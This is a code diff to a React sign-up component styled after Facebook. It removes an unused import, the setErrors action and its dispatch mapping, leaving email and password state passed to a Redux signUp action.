@@ -1,16 +1,15 @@
-import React, { useState, useEffect } from "react";
+import React, { useState } from "react";
 import { connect } from "react-redux";
-import { setSignUp, setErrors } from "../../redux/user/user.action";
+import { setSignUp } from "../../redux/user/user.action";
 
 import "./facebook.css";
 import fblogo from "../../asset/image/fblogo.png";
 
-function Facebook({ errors, setErrors, signUp }) {
+function Facebook({ errors, signUp }) {
   const [userCrediential, setUserCrediential] = useState({
     email: "",
     password: "",
   });
-
 
   const handleChange = (e) => {
     const { name, value } = e.target;
@@ -141,7 +140,6 @@ const mapStateToProps = (state) => ({
 });
 
 const mapDispatchTOProps = (dispatch) => ({
-  setErrors: (error) => dispatch(setErrors(error)),
   signUp: (user) => dispatch(setSignUp(user)),
 });
 
